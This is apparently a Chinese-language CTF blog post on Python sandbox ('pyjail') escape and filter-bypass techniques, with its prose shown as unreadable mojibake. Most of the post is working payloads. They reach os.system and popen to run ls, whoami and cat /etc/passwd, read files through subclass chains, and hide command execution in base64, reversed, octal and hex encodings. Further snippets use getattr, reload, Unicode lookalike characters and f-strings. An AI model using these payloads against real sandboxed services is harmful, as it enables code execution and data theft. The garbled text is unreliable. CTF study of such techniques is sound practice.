---
title: CTF Pyjail æ²™ç®±é€ƒé€¸ç»•è¿‡åˆé›†
date: 2023-05-30 10:23:57
categories:
- Python
tags:
- pyjail
toc: true
---

> æ–‡ç« é¦–å‘äºå…ˆçŸ¥ç¤¾åŒºï¼š[CTF Pyjail æ²™ç®±é€ƒé€¸ç»•è¿‡åˆé›† - å…ˆçŸ¥ç¤¾åŒº](https://xz.aliyun.com/t/12647)

æ‰¿æ¥ä¸Šä¸€ç¯‡CTF Pyjail æ²™ç®±é€ƒé€¸åŸç†åˆé›†ï¼Œæœ¬æ–‡ä¸»è¦æ¥è°ˆè°ˆç»•è¿‡æ‰‹æ³•ï¼ŒPyjail ç»•è¿‡è¿‡æ»¤çš„æ‰‹æ³•åƒå¥‡ç™¾æ€ª, æœ¬æ–‡åœ¨å¤ç°ç»å…¸å†å²èµ›é¢˜çš„åŸºç¡€ä¸Šï¼Œé’ˆå¯¹ä¸åŒçš„æ²™ç®±ç±»å‹å¯¹ç»•è¿‡æ‰‹æ³•è¿›è¡Œäº†åˆ†ç±»ï¼Œç¯‡å¹…è¾ƒé•¿æ•¬è¯·ç†è§£ã€‚
1. ç»•è¿‡åˆ é™¤æ¨¡å—æˆ–æ–¹æ³•
2. ç»•è¿‡åŸºäºå­—ç¬¦ä¸²åŒ¹é…çš„è¿‡æ»¤
3. ç»•è¿‡é•¿åº¦é™åˆ¶
4. ç»•è¿‡å‘½åç©ºé—´é™åˆ¶
5. ç»•è¿‡å¤šè¡Œé™åˆ¶
6. å˜é‡è¦†ç›–ä¸å‡½æ•°ç¯¡æ”¹
7. ç»•è¿‡ audit hook
8. ç»•è¿‡ AST æ²™ç®±


## ç»•è¿‡åˆ é™¤æ¨¡å—æˆ–æ–¹æ³•

åœ¨ä¸€äº›æ²™ç®±ä¸­ï¼Œå¯èƒ½ä¼šå¯¹æŸäº›æ¨¡å—æˆ–è€…æ¨¡å—çš„æŸäº›æ–¹æ³•ä½¿ç”¨ `del` å…³é”®å­—è¿›è¡Œåˆ é™¤ã€‚
ä¾‹å¦‚åˆ é™¤ builtins æ¨¡å—çš„ eval æ–¹æ³•ã€‚
```py
>>> __builtins__.__dict__['eval']
<built-in function eval>
>>> del __builtins__.__dict__['eval']
>>> __builtins__.__dict__['eval']
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
KeyError: 'eval'
```

### reload é‡æ–°åŠ è½½
reload å‡½æ•°å¯ä»¥é‡æ–°åŠ è½½æ¨¡å—ï¼Œè¿™æ ·è¢«åˆ é™¤çš„å‡½æ•°èƒ½è¢«é‡æ–°åŠ è½½
```py
>>> __builtins__.__dict__['eval']
<built-in function eval>
>>> del __builtins__.__dict__['eval']
>>> __builtins__.__dict__['eval']
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
KeyError: 'eval'
>>> reload(__builtins__)
<module '__builtin__' (built-in)>
>>> __builtins__.__dict__['eval']
<built-in function eval>
```
åœ¨ Python 3 ä¸­ï¼Œreload() å‡½æ•°è¢«ç§»åŠ¨åˆ° importlib æ¨¡å—ä¸­ï¼Œæ‰€ä»¥å¦‚æœè¦ä½¿ç”¨ reload() å‡½æ•°ï¼Œéœ€è¦å…ˆå¯¼å…¥ importlib æ¨¡å—ã€‚

### æ¢å¤ sys.modules
ä¸€äº›è¿‡æ»¤ä¸­å¯èƒ½å°† `sys.modules['os']` è¿›è¡Œä¿®æ”¹. è¿™ä¸ªæ—¶å€™å³ä½¿å°† os æ¨¡å—å¯¼å…¥è¿›æ¥,ä¹Ÿæ˜¯æ— æ³•ä½¿ç”¨çš„.
```py
>>> sys.modules['os'] = 'not allowed'
>>> __import__('os').system('ls')
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
AttributeError: 'str' object has no attribute 'system'
```
ç”±äºå¾ˆå¤šåˆ«çš„å‘½ä»¤æ‰§è¡Œåº“ä¹Ÿä½¿ç”¨åˆ°äº† os,å› æ­¤ä¹Ÿä¼šå—åˆ°ç›¸åº”çš„å½±å“,ä¾‹å¦‚ subprocess
```py
>>> __import__('subprocess').Popen('whoami', shell=True)
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "/home/kali/.pyenv/versions/3.8.10/lib/python3.8/subprocess.py", line 688, in <module>
    class Popen(object):
  File "/home/kali/.pyenv/versions/3.8.10/lib/python3.8/subprocess.py", line 1708, in Popen
    def _handle_exitstatus(self, sts, _WIFSIGNALED=os.WIFSIGNALED,
AttributeError: 'str' object has no attribute 'WIFSIGNALED'
```
ç”±äº import å¯¼å…¥æ¨¡å—æ—¶ä¼šæ£€æŸ¥ sys.modules ä¸­æ˜¯å¦å·²ç»æœ‰è¿™ä¸ªç±»ï¼Œå¦‚æœæœ‰åˆ™ä¸åŠ è½½,æ²¡æœ‰åˆ™åŠ è½½.å› æ­¤æˆ‘ä»¬åªéœ€è¦å°† os æ¨¡å—åˆ é™¤,ç„¶åå†æ¬¡å¯¼å…¥å³å¯.
```py
sys.modules['os'] = 'not allowed' # oj ä¸ºä½ åŠ çš„

del sys.modules['os']
import os
os.system('ls')
```

### åŸºäºç»§æ‰¿é“¾è·å–
åœ¨æ¸…ç©ºäº† `__builtins__`çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡ç´¢å¼• subclasses æ¥æ‰¾åˆ°è¿™äº›å†…å»ºå‡½æ•°ã€‚
```py
# æ ¹æ®ç¯å¢ƒæ‰¾åˆ° bytes çš„ç´¢å¼•ï¼Œæ­¤å¤„ä¸º 5
>>> ().__class__.__base__.__subclasses__()[5]
<class 'bytes'>
```
## ç»•è¿‡åŸºäºå­—ç¬¦ä¸²åŒ¹é…çš„è¿‡æ»¤

### å­—ç¬¦ä¸²å˜æ¢

#### å­—ç¬¦ä¸²æ‹¼æ¥
åœ¨æˆ‘ä»¬çš„ payload ä¸­ï¼Œä¾‹å¦‚å¦‚ä¸‹çš„ payloadï¼Œ`__builtins__` `file` è¿™äº›å­—ç¬¦ä¸²å¦‚æœè¢«è¿‡æ»¤äº†ï¼Œå°±å¯ä»¥ä½¿ç”¨å­—ç¬¦ä¸²å˜æ¢çš„æ–¹å¼è¿›è¡Œç»•è¿‡ã€‚
```py
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['file']('E:/passwd').read()

''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__buil'+'tins__']['fi'+'le']('E:/passwd').read()
```
å½“ç„¶ï¼Œå¦‚æœè¿‡æ»¤çš„æ˜¯ `__class__` æˆ–è€… `__mro__` è¿™æ ·çš„å±æ€§åï¼Œå°±æ— æ³•é‡‡ç”¨å˜å½¢æ¥ç»•è¿‡äº†ã€‚

#### base64 å˜å½¢
base64 ä¹Ÿå¯ä»¥è¿ç”¨åˆ°å…¶ä¸­
```py
>>> import base64
>>> base64.b64encode('__import__')
'X19pbXBvcnRfXw=='
>>> base64.b64encode('os')
'b3M='
>>> __builtins__.__dict__['X19pbXBvcnRfXw=='.decode('base64')]('b3M='.decode('base64')).system('calc')
0
```

#### é€†åº
```py
>>> eval(')"imaohw"(metsys.)"so"(__tropmi__'[::-1])
kali
>>> exec(')"imaohw"(metsys.so ;so tropmi'[::-1])
kali
```
æ³¨æ„ exec ä¸ eval åœ¨æ‰§è¡Œä¸Šæœ‰æ‰€å·®å¼‚ã€‚

#### è¿›åˆ¶è½¬æ¢
å…«è¿›åˆ¶ï¼š
```py
exec("print('RCE'); __import__('os').system('ls')")
exec("\137\137\151\155\160\157\162\164\137\137\50\47\157\163\47\51\56\163\171\163\164\145\155\50\47\154\163\47\51")
```

exp:
```py
s = "eval(list(dict(v_a_r_s=True))[len([])][::len(list(dict(aa=()))[len([])])])(__import__(list(dict(b_i_n_a_s_c_i_i=1))[False][::len(list(dict(aa=()))[len([])])]))[list(dict(a_2_b___b_a_s_e_6_4=1))[False][::len(list(dict(aa=()))[len([])])]](list(dict(X19pbXBvcnRfXygnb3MnKS5wb3BlbignZWNobyBIYWNrZWQ6IGBpZGAnKS5yZWFkKCkg=True))[False])"
octal_string = "".join([f"\\{oct(ord(c))[2:]}" for c in s])
print(octal_string)
```

åå…­è¿›åˆ¶ï¼š
```py
exec("\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x6c\x73\x27\x29")
```

exp:
```py
s = "eval(eval(list(dict(v_a_r_s=True))[len([])][::len(list(dict(aa=()))[len([])])])(__import__(list(dict(b_i_n_a_s_c_i_i=1))[False][::len(list(dict(aa=()))[len([])])]))[list(dict(a_2_b___b_a_s_e_6_4=1))[False][::len(list(dict(aa=()))[len([])])]](list(dict(X19pbXBvcnRfXygnb3MnKS5wb3BlbignZWNobyBIYWNrZWQ6IGBpZGAnKS5yZWFkKCkg=True))[False]))"
octal_string = "".join([f"\\x{hex(ord(c))[2:]}" for c in s])
print(octal_string)
```

#### å…¶ä»–ç¼–ç 
hexã€rot13ã€base32 ç­‰ã€‚


### è¿‡æ»¤äº†å±æ€§åæˆ–è€…å‡½æ•°å
åœ¨ payload çš„æ„é€ ä¸­ï¼Œæˆ‘ä»¬å¤§é‡çš„ä½¿ç”¨äº†å„ç§ç±»ä¸­çš„å±æ€§ï¼Œä¾‹å¦‚ `__class__`ã€`__import__` ç­‰ã€‚
#### getattr å‡½æ•°
getattr æ˜¯ Python çš„å†…ç½®å‡½æ•°ï¼Œç”¨äºè·å–ä¸€ä¸ªå¯¹è±¡çš„å±æ€§æˆ–è€…æ–¹æ³•ã€‚å…¶è¯­æ³•å¦‚ä¸‹ï¼š

```python
getattr(object, name[, default])
```
è¿™é‡Œï¼Œobject æ˜¯å¯¹è±¡ï¼Œname æ˜¯å­—ç¬¦ä¸²ï¼Œä»£è¡¨è¦è·å–çš„å±æ€§çš„åç§°ã€‚å¦‚æœæä¾›äº† default å‚æ•°ï¼Œå½“å±æ€§ä¸å­˜åœ¨æ—¶ä¼šè¿”å›è¿™ä¸ªå€¼ï¼Œå¦åˆ™ä¼šæŠ›å‡º AttributeErrorã€‚

```py
>>> getattr({},'__class__')
<class 'dict'>
>>> getattr(os,'system')
<built-in function system>
>>> getattr(os,'system')('cat /etc/passwd')
root:x:0:0:root:/root:/usr/bin/zsh
>>> getattr(os,'system111',os.system)('cat /etc/passwd')
root:x:0:0:root:/root:/usr/bin/zsh
```
è¿™æ ·ä¸€æ¥ï¼Œå°±å¯ä»¥å°† payload ä¸­çš„å±æ€§åè½¬åŒ–ä¸ºå­—ç¬¦ä¸²ï¼Œå­—ç¬¦ä¸²çš„å˜æ¢æ–¹å¼å¤šç§å¤šæ ·ï¼Œæ›´æ˜“äºç»•è¿‡é»‘åå•ã€‚

#### `__getattribute__` å‡½æ•°
`__getattribute__` äºï¼Œå®ƒå®šä¹‰äº†å½“æˆ‘ä»¬å°è¯•è·å–ä¸€ä¸ªå¯¹è±¡çš„å±æ€§æ—¶åº”è¯¥è¿›è¡Œçš„æ“ä½œã€‚

å®ƒçš„åŸºæœ¬è¯­æ³•å¦‚ä¸‹ï¼š

```python
class MyClass:
    def __getattribute__(self, name):
```
getattr å‡½æ•°åœ¨è°ƒç”¨æ—¶ï¼Œå®é™…ä¸Šå°±æ˜¯è°ƒç”¨è¿™ä¸ªç±»çš„ `__getattribute__` æ–¹æ³•ã€‚
```py
>>> os.__getattribute__
<method-wrapper '__getattribute__' of module object at 0x7f06a9bf44f0>
>>> os.__getattribute__('system')
<built-in function system>
```

#### `__getattr__` å‡½æ•°
`__getattr__` æ˜¯ Python çš„ä¸€ä¸ªç‰¹æ®Šæ–¹æ³•ï¼Œå½“å°è¯•è®¿é—®ä¸€ä¸ªå¯¹è±¡çš„ä¸å­˜åœ¨çš„å±æ€§æ—¶ï¼Œå®ƒå°±ä¼šè¢«è°ƒç”¨ã€‚å®ƒå…è®¸ä¸€ä¸ªå¯¹è±¡åŠ¨æ€åœ°è¿”å›ä¸€ä¸ªå±æ€§å€¼ï¼Œæˆ–è€…æŠ›å‡ºä¸€ä¸ª `AttributeError` å¼‚å¸¸ã€‚

å¦‚ä¸‹æ˜¯ `__getattr__` æ–¹æ³•çš„åŸºæœ¬å½¢å¼ï¼š

```python
class MyClass:
    def __getattr__(self, name):
        return 'You tried to get ' + name
```

åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œä»»ä½•ä½ å°è¯•è®¿é—®çš„ä¸å­˜åœ¨çš„å±æ€§éƒ½ä¼šè¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå½¢å¦‚ "You tried to get X"ï¼Œå…¶ä¸­ X æ˜¯ä½ å°è¯•è®¿é—®çš„å±æ€§åã€‚

ä¸ `__getattribute__` ä¸åŒï¼Œ`__getattr__` åªæœ‰åœ¨å±æ€§æŸ¥æ‰¾å¤±è´¥æ—¶æ‰ä¼šè¢«è°ƒç”¨ï¼Œè¿™ä½¿å¾— `__getattribute__` å¯ä»¥ç”¨æ¥æ›´ä¸ºå…¨é¢åœ°æ§åˆ¶å±æ€§è®¿é—®ã€‚

å¦‚æœåœ¨ä¸€ä¸ªç±»ä¸­åŒæ—¶å®šä¹‰äº† `__getattr__` å’Œ `__getattribute__`ï¼Œé‚£ä¹ˆæ— è®ºå±æ€§æ˜¯å¦å­˜åœ¨ï¼Œ`__getattribute__` éƒ½ä¼šè¢«é¦–å…ˆè°ƒç”¨ã€‚åªæœ‰å½“ `__getattribute__` æŠ›å‡º `AttributeError` å¼‚å¸¸æ—¶ï¼Œ`__getattr__` æ‰ä¼šè¢«è°ƒç”¨ã€‚

å¦å¤–ï¼Œæ‰€æœ‰çš„ç±»éƒ½ä¼šæœ‰`__getattribute__`å±æ€§ï¼Œè€Œä¸ä¸€å®šæœ‰`__getattr__`å±æ€§ã€‚


#### `__globals__` æ›¿æ¢
`__globals__` å¯ä»¥ç”¨ func_globals ç›´æ¥æ›¿æ¢ï¼›

```py
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__
''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals
''.__class__.__mro__[2].__subclasses__()[59].__init__.__getattribute__("__glo"+"bals__")
```

#### `__mro__`ã€`__bases__`ã€`__base__`äº’æ¢

ä¸‰è€…ä¹‹é—´å¯ä»¥ç›¸äº’æ›¿æ¢
```py
''.__class__.__mro__[2]
[].__class__.__mro__[1]
{}.__class__.__mro__[1]
().__class__.__mro__[1]
[].__class__.__mro__[-1]
{}.__class__.__mro__[-1]
().__class__.__mro__[-1]
{}.__class__.__bases__[0]
().__class__.__bases__[0]
[].__class__.__bases__[0]
[].__class__.__base__
().__class__.__base__
{}.__class__.__base__
```



### è¿‡æ»¤ import
python ä¸­é™¤äº†å¯ä»¥ä½¿ç”¨ import æ¥å¯¼å…¥ï¼Œè¿˜å¯ä»¥ä½¿ç”¨ `__import__` å’Œ `importlib.import_module` æ¥å¯¼å…¥æ¨¡å—

#### `__import__`
```py
__import__('os')
```
#### importlib.import_module
ä¸è¿‡ importlib ä¹Ÿéœ€è¦å¯¼å…¥,æ‰€ä»¥æœ‰äº›é¸¡è‚‹.
```py
import importlib
importlib.import_module('os').system('ls')
```
æ³¨æ„ï¼šimportlib éœ€è¦è¿›è¡Œå¯¼å…¥ä¹‹åæ‰èƒ½å¤Ÿä½¿ç”¨

#### `__loader__.load_module`
å¦‚æœä½¿ç”¨ audithook çš„æ–¹å¼è¿›è¡Œè¿‡æ»¤,ä¸Šé¢çš„ä¸¤ç§æ–¹æ³•å°±æ— æ³•ä½¿ç”¨äº†,ä½†æ˜¯ `__loader__.load_module` åº•å±‚å®ç°ä¸ import ä¸åŒ, å› æ­¤æŸäº›æƒ…å†µä¸‹å¯ä»¥ç»•è¿‡.
```py
>>> __loader__.load_module('os')
<module 'os' (built-in)>
```


### è¿‡æ»¤äº† []
å¦‚æœä¸­æ‹¬å·è¢«è¿‡æ»¤äº†ï¼Œåˆ™å¯ä»¥ä½¿ç”¨å¦‚ä¸‹çš„ä¸¤ç§æ–¹å¼æ¥ç»•è¿‡ï¼š

1. è°ƒç”¨`__getitem__()`å‡½æ•°ç›´æ¥æ›¿æ¢ï¼›
2. è°ƒç”¨ pop()å‡½æ•°ï¼ˆç”¨äºç§»é™¤åˆ—è¡¨ä¸­çš„ä¸€ä¸ªå…ƒç´ ï¼Œé»˜è®¤æœ€åä¸€ä¸ªå…ƒç´ ï¼Œå¹¶ä¸”è¿”å›è¯¥å…ƒç´ çš„å€¼ï¼‰æ›¿æ¢ï¼›

```py
''.__class__.__mro__[-1].__subclasses__()[200].__init__.__globals__['__builtins__']['__import__']('os').system('ls')

# __getitem__()æ›¿æ¢ä¸­æ‹¬å·[]
''.__class__.__mro__.__getitem__(-1).__subclasses__().__getitem__(200).__init__.__globals__.__getitem__('__builtins__').__getitem__('__import__')('os').system('ls')

# pop()æ›¿æ¢ä¸­æ‹¬å·[]ï¼Œç»“åˆ__getitem__()åˆ©ç”¨
''.__class__.__mro__.__getitem__(-1).__subclasses__().pop(200).__init__.__globals__.pop('__builtins__').pop('__import__')('os').system('ls')

getattr(''.__class__.__mro__.__getitem__(-1).__subclasses__().__getitem__(200).__init__.__globals__,'__builtins__').__getitem__('__import__')('os').system('ls')
```

### è¿‡æ»¤äº† ''

#### str å‡½æ•°
å¦‚æœè¿‡æ»¤äº†å¼•å·ï¼Œæˆ‘ä»¬ payload ä¸­æ„é€ çš„å­—ç¬¦ä¸²ä¼šå—åˆ°å½±å“ã€‚å…¶ä¸­ä¸€ç§æ–¹æ³•æ˜¯ä½¿ç”¨ str() å‡½æ•°è·å–å­—ç¬¦ä¸²ï¼Œç„¶åç´¢å¼•åˆ°é¢„æœŸçš„å­—ç¬¦ã€‚å°†æ‰€æœ‰çš„å­—ç¬¦è¿æ¥èµ·æ¥å°±å¯ä»¥å¾—åˆ°æœ€ç»ˆçš„å­—ç¬¦ä¸²ã€‚

```py
>>> ().__class__.__new__
<built-in method __new__ of type object at 0x9597e0>
>>> str(().__class__.__new__)
'<built-in method __new__ of type object at 0x9597e0>'
>>> str(().__class__.__new__)[21]
'w'
>>> str(().__class__.__new__)[21]+str(().__class__.__new__)[13]+str(().__class__.__new__)[14]+str(().__class__.__new__)[40]+str(().__class__.__new__)[10]+str(().__class__.__new__)[3]
'whoami'
```

#### chr å‡½æ•°
ä¹Ÿå¯ä»¥ä½¿ç”¨ chr åŠ æ•°å­—æ¥æ„é€ å­—ç¬¦ä¸²
```py
>>> chr(56)
'8'
>>> chr(100)
'd'
>>> chr(100)*40
'dddddddddddddddddddddddddddddddddddddddd'
```

#### list + dict
ä½¿ç”¨ dict å’Œ list è¿›è¡Œé…åˆå¯ä»¥å°†å˜é‡åè½¬åŒ–ä¸ºå­—ç¬¦ä¸²ï¼Œä½†è¿™ç§æ–¹å¼çš„å¼Šç«¯åœ¨äºå­—ç¬¦ä¸²ä¸­ä¸èƒ½æœ‰ç©ºæ ¼ç­‰ã€‚
```py
list(dict(whoami=1))[0]
```
#### `__doc__`
`__doc__` å˜é‡å¯ä»¥è·å–åˆ°ç±»çš„è¯´æ˜ä¿¡æ¯ï¼Œä»å…¶ä¸­ç´¢å¼•å‡ºæƒ³è¦çš„å­—ç¬¦ç„¶åè¿›è¡Œæ‹¼æ¥å°±å¯ä»¥å¾—åˆ°å­—ç¬¦ä¸²ï¼š
```py
().__doc__.find('s')
().__doc__[19]+().__doc__[86]+().__doc__[19]
```


#### bytes å‡½æ•°
bytes å‡½æ•°å¯ä»¥æ¥æ”¶ä¸€ä¸ª ascii åˆ—è¡¨ï¼Œç„¶åè½¬æ¢ä¸ºäºŒè¿›åˆ¶å­—ç¬¦ä¸²ï¼Œå†è°ƒç”¨ decode åˆ™å¯ä»¥å¾—åˆ°å­—ç¬¦ä¸²
```py
bytes([115, 121, 115, 116, 101, 109]).decode()
```

### è¿‡æ»¤äº† +
è¿‡æ»¤äº† + å·ä¸»è¦å½±å“åˆ°äº†æ„é€ å­—ç¬¦ä¸²ï¼Œå‡å¦‚é¢˜ç›®è¿‡æ»¤äº†å¼•å·å’ŒåŠ å·ï¼Œæ„é€ å­—ç¬¦ä¸²è¿˜å¯ä»¥ä½¿ç”¨ join å‡½æ•°ï¼Œåˆå§‹çš„å­—ç¬¦ä¸²å¯ä»¥é€šè¿‡ str() è¿›è¡Œè·å–.å…·ä½“çš„å­—ç¬¦ä¸²å†…å®¹å¯ä»¥ä» `__doc__` ä¸­å–ï¼Œ
```py
str().join(().__doc__[19],().__doc__[23])
```

### è¿‡æ»¤äº†æ•°å­—
å¦‚æœè¿‡æ»¤äº†æ•°å­—çš„è¯ï¼Œå¯ä»¥ä½¿ç”¨ä¸€äº›å‡½æ•°çš„è¿”å›å€¼è·å–ã€‚ä¾‹å¦‚ï¼š
0ï¼š`int(bool([]))`ã€`Flase`ã€`len([])`ã€`any(())`
1ï¼š`int(bool([""]))`ã€`True`ã€`all(())`ã€`int(list(list(dict(aá=())).pop()).pop())`

æœ‰äº† 0 ä¹‹åï¼Œå…¶ä»–çš„æ•°å­—å¯ä»¥é€šè¿‡è¿ç®—è¿›è¡Œè·å–ï¼š
```
0 ** 0 == 1
1 + 1 == 2
2 + 1 == 3
2 ** 2 == 4
```
å½“ç„¶ï¼Œä¹Ÿå¯ä»¥ç›´æ¥é€šè¿‡ repr è·å–ä¸€äº›æ¯”è¾ƒé•¿å­—ç¬¦ä¸²ï¼Œç„¶åä½¿ç”¨ len è·å–å¤§æ•´æ•°ã€‚
```py
>>> len(repr(True))
4
>>> len(repr(bytearray))
19
```
ç¬¬ä¸‰ç§æ–¹æ³•ï¼Œå¯ä»¥ä½¿ç”¨ len + dict + list æ¥æ„é€ ,è¿™ç§æ–¹å¼å¯ä»¥é¿å…è¿ç®—ç¬¦çš„çš„å‡ºç°
```py
0 -> len([])
2 -> len(list(dict(aa=()))[len([])])
3 -> len(list(dict(aaa=()))[len([])])
```
ç¬¬å››ç§æ–¹æ³•: unicode
ä¼šåœ¨åç»­çš„ unicode ç»•è¿‡ä¸­ä»‹ç»

### è¿‡æ»¤äº†ç©ºæ ¼
é€šè¿‡ ()ã€[] æ›¿æ¢

### è¿‡æ»¤äº†è¿ç®—ç¬¦
== å¯ä»¥ç”¨ in æ¥æ›¿æ¢

or å¯ä»¥ç”¨| + -ã€‚ã€‚ã€‚-æ¥æ›¿æ¢

ä¾‹å¦‚
```py
for i in [(100, 100, 1, 1), (100, 2, 1, 2), (100, 100, 1, 2), (100, 2, 1, 1)]:
    ans = i[0]==i[1] or i[2]==i[3]
    print(bool(eval(f'{i[0]==i[1]} | {i[2]==i[3]}')) == ans)
    print(bool(eval(f'- {i[0]==i[1]} - {i[2]==i[3]}')) == ans)
    print(bool(eval(f'{i[0]==i[1]} + {i[2]==i[3]}')) == ans)
```
and å¯ä»¥ç”¨& *æ›¿ä»£

ä¾‹å¦‚
```py
for i in [(100, 100, 1, 1), (100, 2, 1, 2), (100, 100, 1, 2), (100, 2, 1, 1)]:
    ans = i[0]==i[1] and i[2]==i[3]
    print(bool(eval(f'{i[0]==i[1]} & {i[2]==i[3]}')) == ans)
    print(bool(eval(f'{i[0]==i[1]} * {i[2]==i[3]}')) == ans)
```

### è¿‡æ»¤äº† ()

1. åˆ©ç”¨è£…é¥°å™¨ @
2. åˆ©ç”¨é­”æœ¯æ–¹æ³•ï¼Œä¾‹å¦‚ `enum.EnumMeta.__getitem__`

### f å­—ç¬¦ä¸²æ‰§è¡Œ
f å­—ç¬¦ä¸²ç®—ä¸ä¸Šä¸€ä¸ªç»•è¿‡ï¼Œæ›´åƒæ˜¯ä¸€ç§æ–°çš„æ”»å‡»é¢ï¼Œé€šå¸¸æƒ…å†µä¸‹ç”¨æ¥è·å–æ•æ„Ÿä¸Šä¸‹æ–‡ä¿¡æ¯,ä¾‹å¦‚è¿‡å»ç¯å¢ƒå˜é‡
```py
{whoami.__class__.__dict__}
{whoami.__globals__[os].__dict__}
{whoami.__globals__[os].environ}
{whoami.__globals__[sys].path}
{whoami.__globals__[sys].modules}

# Access an element through several links
{whoami.__globals__[server].__dict__[bridge].__dict__[db].__dict__}
```

ä¹Ÿå¯ä»¥ç›´æ¥ RCE
```py
>>> f'{__import__("os").system("whoami")}'
kali
'0'
>>> f"{__builtins__.__import__('os').__dict__['popen']('ls').read()}"
```


### ååºåˆ—åŒ–ç»•è¿‡


### è¿‡æ»¤äº†å†…å»ºå‡½æ•°
#### eval + list + dict æ„é€ 
å‡å¦‚æˆ‘ä»¬åœ¨æ„é€  payload æ—¶éœ€è¦ä½¿ç”¨ str å‡½æ•°ã€bool å‡½æ•°ã€bytes å‡½æ•°ç­‰ï¼Œåˆ™å¯ä»¥ä½¿ç”¨ eval è¿›è¡Œç»•è¿‡ã€‚
```py
>>> eval('str')
<class 'str'>
>>> eval('bool')
<class 'bool'>
>>> eval('st'+'r')
<class 'str'>
```
è¿™æ ·å°±å¯ä»¥å°†å‡½æ•°åè½¬åŒ–ä¸ºå­—ç¬¦ä¸²çš„å½¢å¼ï¼Œè¿›è€Œå¯ä»¥åˆ©ç”¨å­—ç¬¦ä¸²çš„å˜æ¢æ¥è¿›è¡Œç»•è¿‡ã€‚
```py
>>> eval(list(dict(s_t_r=1))[0][::2])
<class 'str'>
```
è¿™æ ·ä¸€æ¥ï¼Œåªè¦ list å’Œ dict æ²¡æœ‰è¢«ç¦ï¼Œå°±å¯ä»¥è·å–åˆ°ä»»æ„çš„å†…å»ºå‡½æ•°ã€‚å¦‚æœæŸä¸ªæ¨¡å—å·²ç»è¢«å¯¼å…¥äº†ï¼Œåˆ™ä¹Ÿå¯ä»¥è·å–è¿™ä¸ªæ¨¡å—ä¸­çš„å‡½æ•°ã€‚


### è¿‡æ»¤äº† . å’Œ ï¼Œå¦‚ä½•è·å–å‡½æ•°
é€šå¸¸æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬ä¼šé€šè¿‡ç‚¹å·æ¥è¿›è¡Œè°ƒç”¨`__import__('binascii').a2b_base64`

æˆ–è€…é€šè¿‡ getattr å‡½æ•°ï¼š`getattr(__import__('binascii'),'a2b_base64')` 

å¦‚æœå°† , å·å’Œ . éƒ½è¿‡æ»¤äº†ï¼Œåˆ™å¯ä»¥æœ‰å¦‚ä¸‹çš„å‡ ç§æ–¹å¼è·å–å‡½æ•°ï¼š
1. å†…å»ºå‡½æ•°å¯ä»¥ä½¿ç”¨`eval(list(dict(s_t_r=1))[0][::2])` è¿™æ ·çš„æ–¹å¼è·å–ã€‚
2. æ¨¡å—å†…çš„å‡½æ•°å¯ä»¥å…ˆä½¿ç”¨ `__import__` å¯¼å…¥å‡½æ•°ï¼Œç„¶åä½¿ç”¨ vars() jè¿›è¡Œè·å–ï¼š
   ```py
   >>> vars(__import__('binascii'))['a2b_base64']
   <built-in function a2b_base64>
   ```

### unicode ç»•è¿‡
Python 3 å¼€å§‹æ”¯æŒéASCIIå­—ç¬¦çš„æ ‡è¯†ç¬¦ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå¯ä»¥ä½¿ç”¨ Unicode å­—ç¬¦ä½œä¸º Python çš„å˜é‡åï¼Œå‡½æ•°åç­‰ã€‚Python åœ¨è§£æä»£ç æ—¶ï¼Œä½¿ç”¨çš„ Unicode Normalization Form KC (NFKC) è§„èŒƒåŒ–ç®—æ³•ï¼Œè¿™ç§ç®—æ³•å¯ä»¥å°†ä¸€äº›è§†è§‰ä¸Šç›¸ä¼¼çš„ Unicode å­—ç¬¦ç»Ÿä¸€ä¸ºä¸€ä¸ªæ ‡å‡†å½¢å¼ã€‚

```py
>>> eval == ğ˜¦val
True
```
ç›¸ä¼¼ unicode å¯»æ‰¾ç½‘ç«™ï¼šhttp://shapecatcher.com/
å¯ä»¥é€šè¿‡ç»˜åˆ¶çš„æ–¹å¼å¯»æ‰¾ç›¸ä¼¼å­—ç¬¦

ä¸‹é¢æ˜¯ 0-9,a-z çš„ unicode å­—ç¬¦
```
ğŸğŸğŸğŸ‘ğŸ’ğŸ“ğŸ”ğŸ•ğŸ–ğŸ—
ğ˜¢ğ˜£ğ˜¤ğ˜¥ğ˜¦ğ˜§ğ˜¨ğ˜©ğ˜ªğ˜«ğ˜¬ğ˜­ğ˜®ğ˜¯ğ˜°ğ˜±ğ˜²ğ˜³ğ˜´ğ˜µğ˜¶ğ˜·ğ˜¸ğ˜¹ğ˜ºğ˜» 
ğ˜ˆğ˜‰ğ˜Šğ˜‹ğ˜Œğ˜ğ˜ğ˜ğ˜ğ˜‘ğ˜’ğ˜”ğ˜•ğ˜–ğ˜—ğ˜˜ğ˜™ğ˜šğ˜›ğ˜œğ˜ğ˜ğ˜Ÿğ˜ ğ˜¡ 
```

ä¸‹åˆ’çº¿å¯ä»¥ä½¿ç”¨å¯¹åº”çš„å…¨è§’å­—ç¬¦è¿›è¡Œæ›¿æ¢ï¼š
```
ï¼¿
```
ä½¿ç”¨æ—¶æ³¨æ„ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸èƒ½ä¸ºå…¨è§’ï¼Œå¦åˆ™ä¼šæŠ¥é”™ï¼š
```py
>>> print(_ï¼¿name_ï¼¿)
__main__
>>> print(ï¼¿ï¼¿name_ï¼¿)
  File "<stdin>", line 1
    print(ï¼¿ï¼¿name_ï¼¿)
          ^
SyntaxError: invalid character 'ï¼¿' (U+FF3F)
```

**éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒæŸäº› unicode åœ¨é‡åˆ° lower() å‡½æ•°æ—¶ä¹Ÿä¼šå‘ç”Ÿå˜æ¢ï¼Œå› æ­¤ç¢°åˆ° lower()ã€upper() è¿™æ ·çš„å‡½æ•°æ—¶è¦æ ¼å¤–æ³¨æ„ã€‚**

